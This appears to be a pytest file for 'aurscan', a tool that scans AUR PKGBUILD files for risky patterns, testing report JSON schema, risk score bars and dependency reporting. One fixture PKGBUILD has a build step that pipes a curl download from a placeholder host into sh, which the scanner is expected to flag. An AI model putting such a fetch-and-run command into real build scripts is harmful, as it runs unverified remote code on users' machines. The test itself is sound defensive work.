"""Tests for report construction and JSON rendering."""

from __future__ import annotations

import json

import pytest
from rich.console import Console

from aurscan.models import Report, Severity, Verdict
from aurscan.parse import parse_pkgbuild
from aurscan.report import (
    _iter_reports,
    build_report,
    highest_verdict,
    render_human,
    render_json,
    score_bar,
)
from aurscan.rules import RuleContext, registry
from aurscan.scoring import ScoringConfig, ScoringThresholds, load_scoring_config
from tests.rules_utils import make_meta

STRONG = "b1946ac92492d2347c6235b4d2611184b1946ac92492d2347c6235b4d2611184"
CURL_SNIPPET = "curl -s https://example.invalid/a.sh"
PIPE_COMMAND = f"{CURL_SNIPPET} | sh"
SOURCE = f"""\
pkgname=demo
pkgver=1.0
pkgrel=1
arch=('x86_64')
url="https://example.invalid/demo"
source=("$url/demo-$pkgver.tar.gz")
sha256sums=('{STRONG}')

build() {{
  {PIPE_COMMAND}
}}
"""


def test_json_report_finding_has_full_schema() -> None:
    parsed = parse_pkgbuild(SOURCE)
    assert parsed.pkgbuild is not None
    meta = make_meta()
    context = RuleContext(
        pkgbuild=parsed.pkgbuild,
        install_scripts=(),
        meta=meta,
    )
    report = build_report(meta, parsed, registry.run_all(context))

    payload = json.loads(render_json(report))

    assert payload["findings"]
    item = next(
        finding for finding in payload["findings"] if finding["rule_id"] == "R01"
    )
    assert set(item) == {
        "rule_id",
        "severity",
        "message",
        "file",
        "line",
        "snippet",
        "source",
    }
    assert item["rule_id"] == "R01"
    assert item["severity"] == "high"
    assert item["message"]
    assert item["file"] == "PKGBUILD"
    assert item["line"] == SOURCE.splitlines().index(f"  {PIPE_COMMAND}") + 1
    assert item["snippet"] == CURL_SNIPPET
    assert item["source"] == "static"


def _empty_report(
    name: str,
    *,
    verdict: Verdict = Verdict.OK,
    score: int = 0,
    dep_of: str | None = None,
    errors: list[str] | None = None,
) -> Report:
    return Report(
        package=make_meta(name=name),
        findings=[],
        score=score,
        verdict=verdict,
        errors=list(errors or []),
        dependencies=[],
        dep_of=dep_of,
    )


def test_score_bar_is_proportional() -> None:
    assert score_bar(0, 100) == "\u2591" * 20
    assert score_bar(50, 100) == "\u2588" * 10 + "\u2591" * 10
    assert score_bar(72, 100) == "\u2588" * 14 + "\u2591" * 6
    assert score_bar(100, 100) == "\u2588" * 20
    assert score_bar(120, 100) == "\u2588" * 20
    assert score_bar(-5, 100) == "\u2591" * 20


def test_score_bar_rejects_invalid_dimensions() -> None:
    with pytest.raises(ValueError, match="maximum"):
        score_bar(1, 0)
    with pytest.raises(ValueError, match="width"):
        score_bar(1, 100, width=0)


def test_risk_line_includes_score_bar() -> None:
    report = _empty_report("root", verdict=Verdict.RISKY, score=72)
    console = Console(record=True, width=120)

    render_human(report, console, config=load_scoring_config())

    assert (
        "Risk: RISKY (72/100) \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588"
        "\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591"
        in console.export_text()
    )


def test_render_human_uses_injected_scoring_config() -> None:
    report = _empty_report("root", verdict=Verdict.REVIEW, score=5)
    custom = ScoringConfig(
        max_score=10,
        weights={severity: 0 for severity in Severity},
        thresholds=ScoringThresholds(review=1, risky=2),
    )
    console = Console(record=True, width=120)

    render_human(report, console, config=custom)

    assert "Risk: REVIEW (5/10)" in console.export_text()


def test_highest_verdict_includes_nested_dependencies() -> None:
    root = _empty_report("root")
    dependency = _empty_report("bar-helper", verdict=Verdict.REVIEW, score=12, dep_of="root")
    child = _empty_report("nested", verdict=Verdict.RISKY, score=72, dep_of="bar-helper")
    dependency.dependencies.append(child)
    root.dependencies.append(dependency)

    assert highest_verdict(root) == Verdict.RISKY
    assert highest_verdict(dependency) == Verdict.RISKY
    assert highest_verdict(child) == Verdict.RISKY


def test_iter_reports_yields_every_dependency_with_its_depth() -> None:
    root = _empty_report("root")
    first = _empty_report("first", dep_of="root")
    second = _empty_report("second", dep_of="root")
    nested = _empty_report("nested", dep_of="first")
    first.dependencies.append(nested)
    root.dependencies.extend([first, second])

    assert [(item.package.name, depth) for item, depth in _iter_reports(root)] == [
        ("root", 0),
        ("first", 1),
        ("second", 1),
        ("nested", 2),
    ]
    assert [(item.package.name, depth) for item, depth in _iter_reports(first, 3)] == [
        ("first", 3),
        ("nested", 4),
    ]


def test_json_dependencies_are_nested() -> None:
    root = _empty_report("root")
    dependency = _empty_report("bar-helper", score=12, dep_of="root")
    dependency.dependencies.append(_empty_report("nested", dep_of="bar-helper"))
    root.dependencies.append(dependency)

    payload = json.loads(render_json(root))

    assert payload["dependencies"][0]["package"]["name"] == "bar-helper"
    assert payload["dependencies"][0]["dep_of"] == "root"
    assert payload["dependencies"][0]["dependencies"][0]["package"]["name"] == "nested"
    assert payload["dependencies"][0]["dependencies"][0]["dep_of"] == "bar-helper"


def test_human_dependency_table_reports_highest_risk_and_notes() -> None:
    root = _empty_report("root")
    dependency = _empty_report("bar-helper", verdict=Verdict.REVIEW, score=12, dep_of="root")
    child = _empty_report(
        "nested",
        verdict=Verdict.RISKY,
        score=72,
        dep_of="bar-helper",
        errors=["could not clone nested: timeout"],
    )
    dependency.dependencies.append(child)
    root.dependencies.append(dependency)
    console = Console(record=True, width=120)

    render_human(root, console, config=load_scoring_config())
    output = console.export_text()

    assert "Dependencies" in output
    assert "bar-helper" in output
    assert "nested" in output
    assert "Highest dependency risk: nested (72)" in output
    assert "Dependency notes" in output
    assert "could not clone nested: timeout" in output

    depths = {
        row[0]: row[2]
        for row in map(str.split, output.splitlines())
        if len(row) == 5 and row[0] in {"bar-helper", "nested"}
    }
    assert depths == {"bar-helper": "1", "nested": "2"}

